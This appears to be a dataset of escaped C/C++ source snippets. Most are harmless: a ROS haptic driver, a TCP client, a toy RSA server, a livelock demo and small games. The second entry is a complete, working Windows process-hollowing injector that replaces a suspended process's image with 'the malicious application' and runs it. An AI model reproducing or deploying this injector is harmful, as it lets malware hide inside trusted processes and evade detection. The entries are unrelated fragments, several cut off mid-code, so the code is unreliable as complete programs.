\"rclcpp/rclcpp.hpp\"\n#include \"geometry_msgs/msg/pose_stamped.hpp\"\n#include \"tf2_ros/transform_broadcaster.h\"\n#include \"geometry_msgs/msg/wrench_stamped.hpp\"\n#include <urdf_model/model.h>\n#include \"sensor_msgs/msg/joint_state.hpp\"\n\n#include <string.h>\n#include <stdio.h>\n#include <math.h>\n#include <assert.h>\n#include <sstream>\n\n#include <HL/hl.h>\n#include <HD/hd.h>\n#include <HDU/hduError.h>\n/*\n *  Copyright (c) 2022 Ivo Dekker ACRO Diepenbeek KULeuven\n\n Permission is hereby granted, free of charge, to any person\n obtaining a copy of this software and associated documentation\n files (the \"Software\"), to deal in the Software without\n restriction, including without limitation the rights to use,\n copy, modify, merge, publish, distribute, sublicense, and/or sell\n copies of the Software, and to permit persons to whom the\n Software is furnished to do so, subject to the following\n conditions:\n\n The above copyright notice and this permission notice shall be\n included in all copies or substantial portions of the Software.\n\n THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES\n OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT\n HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY,\n WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING\n FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR\n OTHER DEALINGS IN THE SOFTWARE.\n */\n\n#include <HDU/hduVector.h>\n#include <HDU/hduMatrix.h>\n\n#include \"omni_msgs/msg/omni_button_event.hpp\"\n#include \"omni_msgs/msg/omni_feedback.hpp\"\n#include <pthread.h>\n\nfloat prev_time;\nint calibrationStyle;\n#define DEVICE_NAME \"Touchx\"\nstruct OmniState\n{\n    hduVector3Dd position; // 3x1 vector of position\n    hduVector3Dd velocity; // 3x1 vector of velocity\n    hduVector3Dd inp_vel1; // 3x1 history of velocity used for filtering velocity estimate\n    hduVector3Dd inp_vel2;\n    hduVector3Dd inp_vel3;\n    hduVector3Dd out_vel1;\n    hduVector3Dd out_vel2;\n    hduVector3Dd out_vel3;\n    hduVector3Dd pos_hist1; // 3x1 history of position used for 2nd order backward difference estimate of velocity\n    hduVector3Dd pos_hist2;\n    hduVector3Dd rot;\n    hduVector3Dd joints;\n    hduVector3Dd force; // 3 element double vector force[0], force[1], force[2]\n    float thetas[7];\n    int buttons[2];\n    int buttons_prev[2];\n    bool lock;\n    hduVector3Dd lock_pos;\n};\n\nclass PhantomROS\n{\n\npublic:\n    std::shared_ptr<rclcpp::Node> node_;\n    rclcpp::Publisher<geometry_msgs::msg::PoseStamped>::SharedPtr pose_publisher;\n    rclcpp::Publisher<sensor_msgs::msg::JointState>::SharedPtr joint_pub;\n\n    rclcpp::Publisher<omni_msgs::msg::OmniButtonEvent>::SharedPtr button_publisher;\n    rclcpp::Subscription<omni_msgs::msg::OmniFeedback>::SharedPtr haptic_sub;\n    std::string omni_name;\n    std::string sensable_frame_name;\n    std::string link_names[7];\n    int publish_rate;\n\n    OmniState *state;\n    std::shared_ptr<tf2_ros::TransformBroadcaster> br;\n\n    PhantomROS(std::shared_ptr<rclcpp::Node> node)\n    {\n        node_ = node;\n        node_->declare_parameter<std::string>(\"~omni_name\", \"phantom\");\n        node_->get_parameter<std::string>(\"~omni_name\", omni_name);\n        node_->declare_parameter<int>(\"publish_rate\", 100);\n        node_->get_parameter<int>(\"publish_rate\", publish_rate);\n        br = std::make_shared<tf2_ros::TransformBroadcaster>(node_);\n    }\n\n    void init(OmniState *s)\n    {\n        // Publish on NAME/pose\n        std::ostringstream stream00;\n        stream00 << omni_name << \"/pose\";\n        std::string pose_topic_name = std::string(stream00.str());\n        pose_publisher = node_->create_publisher<geometry_msgs::msg::PoseStamped>(\n            pose_topic_name.c_str(), 100);\n\n        joint_pub = node_->create_publisher<sensor_msgs::msg::JointSt",
    "#include <Windows.h>\n#include <iostream>\n#include <string>\n#include <iomanip> \n#pragma comment(lib, \"ntdll.lib\")\n\nusing namespace std;\n\ntypedef LONG(NTAPI* pfnZwUnmapViewOfSection)(HANDLE, PVOID);\n\nvoid LogHex(const string& message, PVOID value) {\n    cout << \"[+] \" << message << \" : 0x\" << hex << uppercase << (uintptr_t)value << nouppercase << dec << endl;\n}\n\nint main() {\n    string target, maliciousApp;\n    cout << \"Enter the path of the target process: \";\n    getline(cin, target);\n    cout << \"Enter the path of the malicious application: \";\n    getline(cin, maliciousApp);\n\n    LPSTARTUPINFOA target_si = new STARTUPINFOA();\n    LPPROCESS_INFORMATION target_pi = new PROCESS_INFORMATION();\n    CONTEXT c;\n\n    if (!CreateProcessA(\n        target.c_str(),\n        NULL,\n        NULL,\n        NULL,\n        TRUE,\n        CREATE_SUSPENDED,\n        NULL,\n        NULL,\n        target_si,\n        target_pi)) {\n        cerr << \"[!] Failed to create the target process. Error: \" << GetLastError() << endl;\n        return 1;\n    }\n\n    LogHex(\"Target Process PEB\", (PVOID)(target_pi->hProcess));\n\n    HANDLE hMaliciousCode = CreateFileA(\n        maliciousApp.c_str(),\n        GENERIC_READ,\n        FILE_SHARE_READ,\n        NULL,\n        OPEN_EXISTING,\n        NULL,\n        NULL);\n\n    if (hMaliciousCode == INVALID_HANDLE_VALUE) {\n        cerr << \"[!] Failed to open the malicious application. Error: \" << GetLastError() << endl;\n        TerminateProcess(target_pi->hProcess, 0);\n        return 1;\n    }\n\n    DWORD maliciousFileSize = GetFileSize(hMaliciousCode, NULL);\n    PVOID pMaliciousImage = VirtualAlloc(NULL, maliciousFileSize, 0x3000, 0x04);\n    DWORD numberOfBytesRead;\n\n    if (!ReadFile(hMaliciousCode, pMaliciousImage, maliciousFileSize, &numberOfBytesRead, NULL)) {\n        cerr << \"[!] Failed to read the malicious application into memory. Error: \" << GetLastError() << endl;\n        TerminateProcess(target_pi->hProcess, 0);\n        return 1;\n    }\n\n    CloseHandle(hMaliciousCode);\n\n    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;\n    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew);\n\n    cout << \"[+] The PE file is valid.\" << endl;\n    LogHex(\"Source PE Image architecture\", (PVOID)pNTHeaders->FileHeader.Machine);\n\n    c.ContextFlags = CONTEXT_FULL;\n    GetThreadContext(target_pi->hThread, &c);\n\n    PVOID pTargetImageBaseAddress;\n    ReadProcessMemory(\n        target_pi->hProcess,\n        (PVOID)(c.Rdx + 0x10),\n        &pTargetImageBaseAddress,\n        sizeof(PVOID),\n        0);\n\n    LogHex(\"Target Process Image Base\", pTargetImageBaseAddress);\n\n    HMODULE hNtdllBase = GetModuleHandleA(\"ntdll.dll\");\n    pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, \"ZwUnmapViewOfSection\");\n\n    DWORD dwResult = pZwUnmapViewOfSection(target_pi->hProcess, pTargetImageBaseAddress);\n    if (dwResult) {\n        cerr << \"[!] Failed to unmap the section. Error: \" << dwResult << endl;\n        TerminateProcess(target_pi->hProcess, 0);\n        return 1;\n    }\n\n    LogHex(\"Memory allocate at\", pTargetImageBaseAddress);\n\n    DWORD sizeOfMaliciousImage = pNTHeaders->OptionalHeader.SizeOfImage;\n\n    PVOID pHollowAddress = VirtualAllocEx(\n        target_pi->hProcess,\n        pTargetImageBaseAddress,\n        sizeOfMaliciousImage,\n        0x3000,\n        0x40);\n\n    if (!pHollowAddress) {\n        cerr << \"[!] Failed to allocate memory in the target process. Error: \" << GetLastError() << endl;\n        TerminateProcess(target_pi->hProcess, 0);\n        return 1;\n    }\n\n    LogHex(\"Headers write at\", pTargetImageBaseAddress);\n\n    if (!WriteProcessMemory(\n        target_pi->hProcess,\n        pTargetImageBaseAddress,\n        pMaliciousImage,\n        pNTHeaders->OptionalHeader.SizeOfHeaders,\n        NULL)) {\n        cerr << \"[!] Failed to write the PE headers. Error: \" << GetLastError() << endl;\n        TerminateProcess(target_pi->hProcess, 0);\n        return 1;\n    }\n\n    for (int i = 0; i < pNTHeaders->FileHeader.NumberOfSections; i++) {\n        PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));\n\n        cout << \"[+] Section \" << pSectionHeader->Name << \" write at : \";\n        LogHex(\"\", (PVOID)((LPBYTE)pTargetImageBaseAddress + pSectionHeader->VirtualAddress));\n\n        WriteProcessMemory(\n            target_pi->hProcess,\n            (PVOID)((LPBYTE)pTargetImageBaseAddress + pSectionHeader->VirtualAddress),\n            (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader->PointerToRawData),\n            pSectionHeader->SizeOfRawData,\n            NULL);\n    }\n\n    c.Rcx = (SIZE_T)((LPBYTE)pTargetImageBaseAddress + pNTHeaders->OptionalHeader.AddressOfEntryPoint);\n\n    SetThreadContext(target_pi->hThread, &c);\n    ResumeThread(target_pi->hThread);\n\n    cout << \"[+] The injection has succeeded!\" << endl;\n\n    return 0;\n",
    "//Longest substring with distinct characters\n\nint longestUniqueSubstr(string &s) {\n    int lastSeen[26];                     // Array to store the last seen index of each character\n    fill(lastSeen, lastSeen + 26, -1);    // Initialize all values to -1 (not seen yet)\n\n    int maxLength = 0;                    // Result: Length of the longest substring\n    int i = 0;                            // Start pointer of the sliding window\n\n    for (int j = 0; j < s.size(); j++) {\n        int charIndex = s[j] - 'a';       // Map the character to the array index (0-25)\n\n        // Move the start pointer if the character is already in the current window\n        if (lastSeen[charIndex] != -1) {\n            i = max(i, lastSeen[charIndex] + 1); // Ensure `i` moves forward\n        }\n\n        // Update the last seen index of the current character\n        lastSeen[charIndex] = j;\n\n        // Update the maximum length of the substring\n        maxLength = max(maxLength, j - i + 1);\n    }\n\n    return maxLength;\n}\n",
    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <arpa/inet.h>\n#include <sys/socket.h>\n\nint main(int argc, char const *argv[])\n{\n\n    if (argc != 3)\n    {\n        fprintf(stderr, \"Usage: %s <IP> <Port>\\n\", argv[0]);\n        exit(EXIT_FAILURE);\n    }\n\n    const char *server_ip = argv[1];\n    int server_port = atoi(argv[2]);\n\n    // \u521b\u5efa\u5957\u63a5\u5b57\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    // 0: \u5bf9\u4e8e SOCK_STREAM \uff0c\u9ed8\u8ba4\u534f\u8bae\u662f TCP\n    if (sock < 0)\n    {\n        perror(\"socket() failed\");\n        exit(EXIT_FAILURE);\n    }\n\n    // \u5411\u670d\u52a1\u5668(\u7279\u5b9a\u7684IP\u548c\u7aef\u53e3)\u53d1\u8d77\u8bf7\u6c42\n    struct sockaddr_in serv_addr;\n\n    memset(&serv_addr, 0, sizeof(serv_addr));\n\n    serv_addr.sin_family = AF_INET;\n    serv_addr.sin_addr.s_addr = inet_addr(server_ip);\n    serv_addr.sin_port = htons(server_port);\n\n    // \u5728\u5ba2\u6237\u7aef\u7a0b\u5e8f\u4e2d\u5c06\u5957\u63a5\u5b57\u8fde\u63a5\u5230\u6307\u5b9a\u7684\u670d\u52a1\u5668\u5730\u5740,\u5efa\u7acb\u4e0e\u670d\u52a1\u5668\u7684\u8fde\u63a5\n    if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)\n    {\n        perror(\"connect() failed\");\n        close(sock);\n        exit(EXIT_FAILURE);\n    }\n    // sockfd:  \u5957\u63a5\u5b57\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u7531 socket \u51fd\u6570\u521b\u5efa\n    // addr:    \u6307\u5411 sockaddr \u7ed3\u6784\u4f53\u7684\u6307\u9488\uff0c\u8be5\u7ed3\u6784\u4f53\u5305\u542b\u8981\u8fde\u63a5\u7684\u670d\u52a1\u5668\u7684\u5730\u5740\u4fe1\u606f\n    // addrlen: sockaddr \u7ed3\u6784\u4f53\u7684\u957f\u5ea6\n\n    // \u8bfb\u53d6\u670d\u52a1\u5668\u4f20\u56de\u7684\u6570\u636e\n    char buffer[40];\n    // \u4ece\u5957\u63a5\u5b57\u4e2d\u8bfb\u53d6\u6570\u636e\n    ssize_t numBytes = read(sock, buffer, sizeof(buffer) - 1);\n    // fd:    \u6587\u4ef6\u63cf\u8ff0\u7b26\u3002\u53ef\u4ee5\u662f\u5957\u63a5\u5b57\u3001\u6587\u4ef6\u6216\u5176\u4ed6\u53ef\u8bfb\u8bbe\u5907\u7684\u63cf\u8ff0\u7b26\n    // buf:   \u6307\u5411\u4e00\u4e2a\u7f13\u51b2\u533a\u7684\u6307\u9488\uff0c\u7528\u4e8e\u5b58\u50a8\u8bfb\u53d6\u7684\u6570\u636e\n    // count: \u8981\u8bfb\u53d6\u7684\u5b57\u8282\u6570;\u8bfb\u53d6\u7684\u6700\u5927\u5b57\u8282\u6570\u4e3a sizeof(buffer) - 1\uff0c\u4ee5\u786e\u4fdd\u7f13\u51b2\u533a\u7559\u6709\u7a7a\u95f4\u5b58\u50a8\u7a7a\u5b57\u7b26(\u7ed3\u675f\u7b26)\n    if (numBytes < 0)\n    {\n        perror(\"read() failed\");\n        close(sock);\n        exit(EXIT_FAILURE);\n    }\n    buffer[numBytes] = '\\0'; // \u786e\u4fdd\u5b57\u7b26\u4e32\u4ee5 null \u7ed3\u5c3e\n\n    printf(\"Message form server: %s\\n\", buffer);\n\n    // \u5173\u95ed\u5957\u63a5\u5b57\n    close(sock);\n\n    return 0;\n}\n",
    "//////////////////////////////////////////////////////////////\n// TCP SECURE SERVER GCC (IPV6 ready)\n//\n// Socket code provided by Napoleon Reyes (Massey University)\n//\n//////////////////////////////////////////////////////////////\n\n#define DEFAULT_PORT \"1234\" \n#define USE_IPV6 true      //if set to false, IPv4 addressing scheme will be used\n\n#if defined __unix__ || defined __APPLE__\n   #include <unistd.h>\n   #include <errno.h>\n   #include <stdlib.h>\n   #include <stdio.h>\n   #include <string.h>\n   #include <sys/types.h>\n   #include <sys/socket.h>\n   #include <arpa/inet.h>\n   #include <netdb.h> //used by getnameinfo()\n   #include <iostream>\n   #include <random>\n   #include <vector>       // used for the extended euclidean algorithm \n#elif defined __WIN32__\n   #include <winsock2.h>\n   #include <ws2tcpip.h> //required by getaddrinfo() and special constants\n   #include <stdlib.h>\n   #include <stdio.h>\n   #include <iostream>\n   #include <random>    // to get random numbers for the keys\n   #include <vector>    // used for the extended euclidean algorithm \n   #define WSVERS MAKEWORD(2,2) // set the version number\n   WSADATA wsadata; //Create a WSADATA object called wsadata. \n#endif\n\n\n#define BUFFER_SIZE 500\n#define RBUFFER_SIZE 256\nusing namespace std;\n\n\n\n//*******************************************************************\n// VALUES FOR CA AND SERVER KEYS     -> values are long long as extended euclidean wont work with negative\n//                                        numbers introduced by using unsigned ints\n//********************************************************************\nlong long dCA, eCA, nCA = 0;           // Certificate Authority keys. Setting nCA to 0 to ensure get a larger value for nCA when calculating values\nlong long eServer, dServer, nServer;   // server's private and public keys\nlong long p, q, z;                     // other values required for RSA -> resuse for both key types\nlong long nonce;                       // hold the DECRYPTED nonce value from the client\n\n\n\n//*******************************************************************\n// FUNCTIONS\n//*******************************************************************\nvoid printBuffer(const char *header, char *buffer){\n\tcout << \"------\" << header << \"------\" << endl;\n\tfor(unsigned int i=0; i < strlen(buffer); i++){\n\t\tif(buffer[i] == '\\r'){\n\t\t   cout << \"buffer[\" << i << \"]=\\\\r\" << endl;\t\n\t\t} else if(buffer[i] == '\\n'){\n\t\t   cout << \"buffer[\" << i << \"]=\\\\n\" << endl;\t\n\t\t} else {   \n\t\t   cout << \"buffer[\" << i << \"]=\" << buffer[i] << endl;\n\t\t}\n\t}\n\tcout << \"---\" << endl;\n}\n\n\n// Helper function to determine if a number is a prime or not. Used for 'p' and 'q'\nbool isPrime(long long num) {\n    if (num <= 1) return false;\n    if (num <= 3) return true;\n    \n    // iterate only up to the square root of 'num'\n    for (long long i = 2; i <= sqrt(num); i++) {\n        if (num % i == 0) {\n            return false;\n        }\n    }\n    return true;\n}\n\n\n// Return a large prime number\nlong long get_prime() {\n   \n   // Create a random number generator with some arbitrary fixed seed\n   random_device rd;                               \n   default_random_engine gen(rd()); \n    \n   // Possible prime numbers within range of 5K and 15K\n   uniform_int_distribution<> distribution(5000, 15000);\n\n   bool prime = false;\n   long long randomNum;\n\n   // keep getting random number until is a prime\n   while (!prime){\n      randomNum = distribution(gen);        \n      prime = isPrime(randomNum);\n   }\n   return randomNum;\n}\n\n\n// Tests if 'e' and 'z' are coprime using Euclidean algorithm.\nbool euclidean(long long div) {\n   long long dividend = z;\n   long long divisor = div;           // holds value from the get_e() function.\n   long long remainder, quotient;     \n\n   // stop when the remainder turns to 0\n   while(true) {        \n      quotient = dividend / divisor;        \n      remainder = dividend % divisor;\n      if(remainder == 0) {\n         break;\n      }\n\n      dividend = divisor;\n      divisor = remainder;\n   }\n\n   // when remainder is 0 and the divisor is 1, it means that e and z are co-primes.\n   if(remainder == 0 && divisor == 1) {\n      return true;\n   }\n   return false;\n}\n\n\n// This gets a valid value for 'e'. Calls 'euclidean' function to ensure is coprime\nlong long get_e(long long local_n) {\n   \n   // Create a random number generator engine using arbitrary fixed seed\n   random_device rd;                               \n   default_random_engine gen(rd()); \n   \n   // Possible 'e' value within the range of 5K - 10K\n   uniform_int_distribution<> distribution(5000, 10000);\n   bool valid = false;     \n   long long local_e = distribution(gen);     // initial e value. If invalid then will get new random number in loop\n\n   while(!valid) {\n      // If 'local_e' is different to 'p' and 'q', and less than 'n' use Euclidean Algorithm to see if 'e' and 'z' are coprime\n      if (local_e < local_n || (local_e != q && local_e != p)) {\n         valid = euclidean(local_e);\n         if(va",
    "/*\n * Program to Demonstrate Livelock\n *\n * This program simulates a livelock scenario where two threads\n * repeatedly release and retry acquiring shared resources in response\n * to each other's actions. This creates an endless cycle of activity\n * without any progress.\n */\n#include <iostream>\n#include <thread>\n#include <mutex>\n#include <chrono>\n\n// Global mutex variables representing shared resources\nstd::mutex resource1;\nstd::mutex resource2;\n\n// Shared flags to simulate livelock behavior\nvolatile bool thread1_released = false;\nvolatile bool thread2_released = false;\n\n/**\n * Thread 1 function\n * Tries to acquire Resource 1 and Resource 2, but releases Resource 1\n * if it notices Thread 2 is also trying to proceed, creating livelock.\n */\nvoid thread1() \n{\n    while (true) \n    {\n        std::cout << \"Thread 1: Trying to lock Resource 1\\n\";\n        resource1.lock();\n        std::cout << \"Thread 1: Locked Resource 1\\n\";\n\n        // Simulate detection of Thread 2 trying to proceed\n        if (thread2_released) \n        {\n            std::cout << \"Thread 1: Detected Thread 2 is waiting. Releasing Resource 1.\\n\";\n            resource1.unlock();\n            thread1_released = true; // Indicate that Thread 1 released the resource\n            std::this_thread::sleep_for(std::chrono::seconds(1)); // Simulate delay before retrying\n            continue;\n        }\n\n        std::cout << \"Thread 1: Trying to lock Resource 2\\n\";\n        resource2.lock();\n        std::cout << \"Thread 1: Locked Resource 2\\n\";\n\n        // If both locks are acquired (unrealistic in livelock), release them\n        resource2.unlock();\n        resource1.unlock();\n        std::cout << \"Thread 1: Successfully acquired both resources. Exiting.\\n\";\n        break;\n    }\n}\n\n/**\n * Thread 2 function\n * Tries to acquire Resource 2 and Resource 1, but releases Resource 2\n * if it notices Thread 1 is also trying to proceed, creating livelock.\n */\nvoid thread2() \n{\n    while (true) \n    {\n        std::cout << \"Thread 2: Trying to lock Resource 2\\n\";\n        resource2.lock();\n        std::cout << \"Thread 2: Locked Resource 2\\n\";\n\n        // Simulate detection of Thread 1 trying to proceed\n        if (thread1_released) \n        {\n            std::cout << \"Thread 2: Detected Thread 1 is waiting. Releasing Resource 2.\\n\";\n            resource2.unlock();\n            thread2_released = true; // Indicate that Thread 2 released the resource\n            std::this_thread::sleep_for(std::chrono::seconds(1)); // Simulate delay before retrying\n            continue;\n        }\n\n        std::cout << \"Thread 2: Trying to lock Resource 1\\n\";\n        resource1.lock();\n        std::cout << \"Thread 2: Locked Resource 1\\n\";\n\n        // If both locks are acquired (unrealistic in livelock), release them\n        resource1.unlock();\n        resource2.unlock();\n        std::cout << \"Thread 2: Successfully acquired both resources. Exiting.\\n\";\n        break;\n    }\n}\n\n/**\n * Main function\n * Creates threads and cleans up resources.\n */\nint main() \n{\n    std::cout << \"Initializing resources...\\n\";\n\n    // Create threads\n    std::cout << \"Creating threads...\\n\";\n    std::thread t1(thread1);\n    std::thread t2(thread2);\n\n    // Wait for threads to finish\n    t1.join();\n    t2.join();\n\n    std::cout << \"Program completed.\\n\";\n    return 0;\n}\n\n",
    "#include \"asteroidmanager.h\"\n#include \"projectsettings.h\"\n#include \"destructiondebris.h\"\n\nAsteroidManager::AsteroidManager()\n{\n\n}\n\nAsteroidManager::~AsteroidManager()\n{\n\tUnloadTexture(bigAsteroidImage); \n\tUnloadTexture(mediumAsteroidImage);\n\tUnloadTexture(smallAsteroidImage);\n\n\tfor (int i = 0; i < bigAsteroidImages.size(); i++)\n\t{\n\t\tUnloadTexture(bigAsteroidImages[i]);\n\t}\n}\n\n//-------------------- Asteroid Manager Tick -------------------- \nvoid AsteroidManager::Tick(float dt)\n{\n\tfor (int i = 0; i < currentWaveBigAsteroidCount; i++)\n\t{\n\t\tif (bigAsteroids[i].GetAsteroidActiveState())\n\t\t{\n\t\t\tbigAsteroids[i].Tick(dt);\n\t\t}\n\t}\n\t\n\tfor (int i = 0; i < currentWaveMediumAsteroidCount; i++)\n\t{\n\t\tif (mediumAsteroids[i].GetAsteroidActiveState())\n\t\t{\n\t\t\tmediumAsteroids[i].Tick(dt);\n\t\t}\n\t}\n\t\n\tfor (int i = 0; i < currentWaveSmallAsteroidCount; i++)\n\t{\n\t\tif (smallAsteroids[i].GetAsteroidActiveState())\n\t\t{\n\t\t\tsmallAsteroids[i].Tick(dt);\n\t\t}\n\t}\n\n\tfor (int i = 0; i < smallAsteroidDestructionDebris.size(); i++)\n\t{\n\t\tif (smallAsteroidDestructionDebris[i].GetIsDebrisActive())\n\t\t{\n\t\t\tsmallAsteroidDestructionDebris[i].Tick(dt); \n\t\t}\n\t}\n}\n\n//-------------------- Asteroids Setup -------------------- \nvoid AsteroidManager::AsteroidsSetup(int bigAsteroidCount)\n{\n\tmiddleOfScreen.x = (float)ProjectSettings::GetScreenWidth() / 2.0f;\n\tmiddleOfScreen.y = (float)ProjectSettings::GetScreenHeight() / 2.0f;\n\n\tcurrentWaveBigAsteroidCount = bigAsteroidCount; \n\tcurrentWaveMediumAsteroidCount = currentWaveBigAsteroidCount * 2;\n\tcurrentWaveSmallAsteroidCount = currentWaveMediumAsteroidCount * 2;\n\tcurrentWaveTotalAsteroidCount = currentWaveBigAsteroidCount + currentWaveMediumAsteroidCount + currentWaveSmallAsteroidCount;\n\n\tSetupBigAsteroids(); \n\tSetupMediumAsteroids(); \n\tSetupSmallAsteroids(); \n\n\tActivateAsteroids(Asteroid::ASTEROID_BIG, currentWaveBigAsteroidCount, Vector2{ 0,0 }, 0.0f);\n}\n\n//-------------------- Reset Asteroids -------------------- \nvoid AsteroidManager::DeactivateAllAsteroids()\n{\n\tfor (int i = 0; i < currentWaveBigAsteroidCount; i++)\n\t{\n\t\tif (bigAsteroids[i].GetAsteroidActiveState())\n\t\t{\n\t\t\tbigAsteroids[i].SetAsteroidActiveState(false);\n\t\t}\n\n\t\tbigAsteroids[i].SetAsteroidPosition(GetRandomBigAsteroidStartPos(bigAsteroids[i].GetAsteroidImage().width / 2, ProjectSettings::GetScreenWidth() - bigAsteroids[i].GetAsteroidImage().width / 2));\n\t}\n\n\tfor (int i = 0; i < currentWaveMediumAsteroidCount; i++)\n\t{\n\t\tif (mediumAsteroids[i].GetAsteroidActiveState())\n\t\t{\n\t\t\tmediumAsteroids[i].SetAsteroidActiveState(false);\n\t\t}\n\t}\n\n\tfor (int i = 0; i < currentWaveSmallAsteroidCount; i++)\n\t{\n\t\tif (smallAsteroids[i].GetAsteroidActiveState())\n\t\t{\n\t\t\tsmallAsteroids[i].SetAsteroidActiveState(false);\n\t\t}\n\t}\n\n\tfor (int i = 0; i < smallAsteroidDestructionDebris.size(); i++)\n\t{\n\t\tif (smallAsteroidDestructionDebris[i].GetIsDebrisActive())\n\t\t{\n\t\t\tsmallAsteroidDestructionDebris[i].SetIsDebrisActive(false);\n\t\t}\n\t}\n}\n\n//-------------------- Setup Big Asteroids -------------------- \nvoid AsteroidManager::SetupBigAsteroids()\n{\n\twhile (bigAsteroids.size() < currentWaveBigAsteroidCount)\n\t{\n\t\tTexture2D asteroidImage = bigAsteroidImages[GetRandomValue(0, bigAsteroidImages.size() - 1)]; \n\n\t\tVector2 bigAsteroidSpawnPos = GetRandomBigAsteroidStartPos(asteroidImage.width / 2, ProjectSettings::GetScreenWidth() - asteroidImage.width / 2); \n\t\t\n\t\tbigAsteroids.emplace_back(Asteroid::ASTEROID_BIG, asteroidImage, bigAsteroidSpawnPos, false);\n\t}\n}\n\n//-------------------- Reset Big Asteroids Start Position -------------------- \nvoid AsteroidManager::ResetBigAsteroidsStartingPositions()\n{\n\tfor (int i = 0; i < currentWaveBigAsteroidCount; i++)\n\t{\n\t\tbigAsteroids[i].SetAsteroidPosition(GetRandomBigAsteroidStartPos(bigAsteroids[i].GetAsteroidImage().width / 2, ProjectSettings::GetScreenWidth() - bigAsteroids[i].GetAsteroidImage().width / 2));\n\t}\n}\n\n//-------------------- Get a Random Start Position for the big asteroids -------------------- \nVector2 AsteroidManager::GetRandomBigAsteroidStartPos(int min, int max)\n{\n\tint posX;\n\tint posY;\n\n\tdo {\n\t\tposX = GetRandomValue(min, max);\n\t} while (posX > middleOfScreen.x - asteroidSpawnPadding && posX < middleOfScreen.x + asteroidSpawnPadding);\n\n\tdo {\n\t\tposY = GetRandomValue(min, max);\n\t} while (posY > middleOfScreen.y - asteroidSpawnPadding && posY < middleOfScreen.y + asteroidSpawnPadding && posY > 0);\n\n\treturn Vector2{ (float)posX, (float)posY };\n}\n\n//-------------------- Setup Medium Asteroids -------------------- \nvoid AsteroidManager::SetupMediumAsteroids()\n{\n\twhile (mediumAsteroids.size() < currentWaveMediumAsteroidCount)\n\t{\n\t\tmediumAsteroids.emplace_back(Asteroid::ASTEROID_MEDIUM, mediumAsteroidImage, Vector2{ 0,0 }, false);\n\t}\n}\n\n//-------------------- Setup Small Asteroids -------------------- \nvoid AsteroidManager::SetupSmallAsteroids()\n{\n\twhile (smallAsteroids.size() < currentWaveSmallAsteroidCount)\n\t{\n\t\tsmallAsteroids.emplace_back(Asteroid::ASTEROID_SMALL, smallAsteroidImage, Vector2{ 0,0 }, false);\n\t}\n\n\twhile (smallAsteroidDestructio",
    "#include <iostream>\n#include <iomanip>\n\nusing namespace std;\n\n//PROGRAM SIMULATOR KEBUN INI DIBUAT OLEH :\n// 1. Jovi Inzagi (21102064)\n// 2. Muhammad Arif(21102058)\n// 3. Rahmat Ashari(21102043)\n// 4. Rizal Fahmi Yofiawan (21102045\n// 5. Tegar Setio (21102307)\n\nvoid menu();\nvoid tanam(int, int);\nvoid tebang(int, int);\nvoid tumbuh();\nvoid cetak_kebun();\nvoid tanaman(int);\nchar pilih;\n\nint kebun[5][5]; // asumsi kebun 5x5\nint panjang_kebun = 5;\nint lebar_kebun = 5;\n\nint main()\n{\n\tint pilih_menu;\n\tint input_baris;\n\tint input_kolom;\n\n\tdo {\n\t\tmenu();\n\n\t\tcin >> pilih_menu;\n\n\t\tswitch (pilih_menu)\n\t\t{\n\t\tcase 1:\n\t\t\tdo {\n\t\t\t\tdo {\n\t\t\t\t\tcout << \"\\nTanam pada baris : \";\n\t\t\t\t\tcin >> input_baris;\n\t\t\t\t} while (input_baris <= 0 || input_baris > 5);\n\n\t\t\t\tdo {\n\t\t\t\t\tcout << \"\\nTanam pada kolom : \";\n\t\t\t\t\tcin >> input_kolom;\n\t\t\t\t} while (input_kolom <= 0 || input_kolom > 5);\n\n\t\t\t\ttanam(input_baris, input_kolom);\n\n\t\t\t\tdo {\n\t\t\t\t\tcout << endl << \"Ingin melihat kebun (y/n)? \";\n\t\t\t\t\tcin >> pilih;\n\t\t\t\t\tpilih = tolower(pilih);\n\t\t\t\t} while (pilih != 'n' && pilih != 'y');\n\n\t\t\t\tif (pilih == 'y') {\n\t\t\t\t\tcetak_kebun();\n\t\t\t\t}\n\n\t\t\t\tdo {\n\t\t\t\t\tcout << endl << \"Apakah lanjut tanam (y/n)? \";\n\t\t\t\t\tcin >> pilih;\n\t\t\t\t\tpilih = tolower(pilih);\n\t\t\t\t} while (pilih != 'n' && pilih != 'y');\n\n\t\t\t} while (pilih != 'n');\n\t\t\tsystem(\"clear\");\n\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tdo {\n\t\t\t\tdo {\n\t\t\t\t\tcout << \"\\Tebang pada baris : \";\n\t\t\t\t\tcin >> input_baris;\n\t\t\t\t} while (input_baris <= 0 || input_baris > 5);\n\n\t\t\t\tdo {\n\t\t\t\t\tcout << \"\\Tebang pada kolom : \";\n\t\t\t\t\tcin >> input_kolom;\n\t\t\t\t} while (input_kolom <= 0 || input_kolom > 5);\n\n\t\t\t\ttebang(input_baris, input_kolom);\n\n\t\t\t\tdo {\n\t\t\t\t\tcout << endl << \"Ingin melihat kebun (y/n)? \";\n\t\t\t\t\tcin >> pilih;\n\t\t\t\t\tpilih = tolower(pilih);\n\t\t\t\t} while (pilih != 'n' && pilih != 'y');\n\n\t\t\t\tif (pilih 